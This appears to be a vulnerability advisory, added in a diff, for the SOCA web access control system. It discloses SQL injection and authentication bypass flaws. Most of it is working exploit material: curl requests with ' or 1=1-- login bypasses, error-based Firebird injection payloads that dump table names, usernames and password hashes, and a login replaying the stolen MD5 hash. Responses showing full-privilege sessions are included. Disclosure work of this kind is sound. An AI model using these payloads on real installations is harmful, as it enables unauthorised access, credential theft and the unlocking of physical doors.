@@ -1,0 +1,137 @@
+SOCA Access Control System 180612 SQL Injection And Authentication Bypass
+
+
+Vendor: SOCA Technology Co., Ltd
+Product web page: http://www.socatech.com
+Affected version: 180612, 170000 and 141007
+
+Summary: The company's products include proximity and fingerprint access
+control system, time and attendance, electric locks, card reader and writer,
+keyless entry system and other 30 specialized products. All products are
+attractively designed with advanced technology in accordance with users'
+safety and convenience which also fitted international standard.
+
+Desc: The Soca web access control system suffers from multiple SQL Injection
+vulnerabilities. Input passed via multiple POST parameters is not properly
+sanitised before being returned to the user or used in SQL queries. This
+can be exploited to manipulate SQL queries by injecting arbitrary SQL code
+and bypass the authentication mechanism. It allows the attacker to remotely
+disclose password hashes and login with MD5 hash with highest privileges 
+resulting in unlocking doors and bypass the physical access control in place.
+
+Tested on: Windows NT 6.1 build 7601 (Windows 7 Service Pack 1) i586
+           Windows NT 6.2 build 9200 (Windows Server 2012 Standard Edition) i586
+           Apache/2.2.22 (Win32)
+           PHP/5.4.13
+           Firebird/InterBase DBMS
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5519
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5519.php
+
+
+20.04.2018
+
+--
+
+
+Authentication bypass / SQL injection via pos_id POST parameter in Login.php:
+-----------------------------------------------------------------------------
+-version 141007
+
+# curl -X POST --data "pos_id=' or 1=1--&pos_pw=whatever&Lang=eng" -i\
+"http://10.0.0.4/Login/Login.php"
+
+HTTP/1.1 200 OK
+Date: Fri, 03 May 2018 13:37:25 GMT
+Server: Apache/2.2.22 (Win32) PHP/5.4.13
+X-Powered-By: PHP/5.4.13
+Set-Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5
+Content-Type: text/html
+
+ true
+
+
+Authentication bypass / SQL injection via ID POST parameter in Login.php:
+=========================================================================
+-version 180612
+
+# curl -X POST --data "ID=' or 1=1--&PW=whatever&Lang=eng"\
+"http://10.0.0.3/Login/Login.php"
+
+{"LoginCheck":true,"Session":{"IP":"10.0.0.9","sess_Lang":"eng","sess_id":"' or 1=1--","sess_passwd":"008c5926ca861023c1d2a36653fd88e2","sess_Access":{"Reader":1,"User":1,"Card":1,"Groups":1,"Historys":1,"Special_Query":1,"Permission":1,"WorkGroup":1,"Attend":1,"WorkTime":1,"Dep":1,"Holiday":1,"ConvertHistory":1,"Backup_Database":1,"Auto_Update_Card":1,"Mail_Report":1}}}
+
+
+Authenticated SQL injection via cidx POST parameter in Card_Edit_GetJson.php:
+=============================================================================
+
+Dump current user:
+------------------
+
+# curl -X POST --data "cidx=144 and 1=(user)"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "SYSDBA";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+Dump table:
+-----------
+
+# curl -X POST --data "cidx=144 and 1=(select+first+1+skip+57+distinct+rdb$relation_name+from+rdb$relation_fields)"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "USERS";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+Dump column:
+------------
+
+# curl -X POST --data "cidx=144 and 1=(select+first+1+skip+2+distinct+rdb$field_name+from+rdb$relation_fields where rdb$relation_name=(select+first+1+skip+57+distinct+rdb$relation_name+from+rdb$relation_fields))"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "U_NAME";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+Dump column:
+------------
+
+# curl -X POST --data "cidx=144 and 1=(select+first+1+skip+2+distinct+rdb$field_name+from+rdb$relation_fields where rdb$relation_name=(select+first+1+skip+56+distinct+rdb$relation_name+from+rdb$relation_fields))"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "U_PASSWORD";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+Dump username and Idx from USERS table:
+---------------------------------------
+
+# curl -X POST --data "cidx=144 and 1=(select+first+1+skip+0+U_NAME || U_IDX+from+USERS)"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "USER1";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+Dump passwords from UAC table:
+------------------------------
+
+# curl -X POST --data "cidx=144 and 1=(select+first+1+skip+0+U_PASSWORD+from+UAC)"\
+"http://10.0.0.3/Card/Card_Edit_GetJson.php"\
+-H Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+Warning:  ibase_fetch_assoc(): conversion error from string "4a7d1ed414474e4033ac29ccb8653d9b";  in C:\SOCA\WebSite\Card\Card_Edit_GetJson.php on line 17
+
+
+Login with MD5:
+===============
+
+# curl -X POST --data "ID=USER&PW=4a7d1ed414474e4033ac29ccb8653d9b&Lang=eng"
+"http://10.0.0.3/Login/Login.php"\
+
+{"LoginCheck":true,"Session":{"IP":"10.0.0.9","sess_Lang":"eng","sess_id":"USER","sess_passwd":"4a7d1ed414474e4033ac29ccb8653d9b","sess_Access":{"Reader":1,"User":1,"Card":1,"Groups":1,"Historys":1,"Special_Query":1,"Permission":1,"WorkGroup":1,"Attend":1,"WorkTime":1,"Dep":1,"Holiday":1,"ConvertHistory":1,"Backup_Database":1,"Auto_Update_Card":1,"Mail_Report":1}}}
